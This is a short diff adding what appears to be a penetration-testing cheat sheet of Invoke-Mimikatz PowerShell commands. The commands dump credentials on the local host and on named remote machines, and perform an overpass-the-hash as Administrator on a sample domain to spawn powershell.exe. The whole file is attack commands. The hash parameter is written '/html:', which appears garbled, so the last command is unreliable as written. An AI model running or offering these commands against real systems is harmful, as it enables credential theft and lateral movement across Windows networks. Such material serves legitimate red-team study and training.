@@ -1,0 +1,8 @@
+# Dump credentials
+Invoke-Mimikatz -DumpCreds
+
+# Dump creds on other machines
+Invoke-Mimikatz -DumpCreds -ComputerName @("sys1", "sys2")
+
+# Overpass the hash 
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:mychild1.myforest.local /html:<ntlmhash> /run:powershell.exe"'
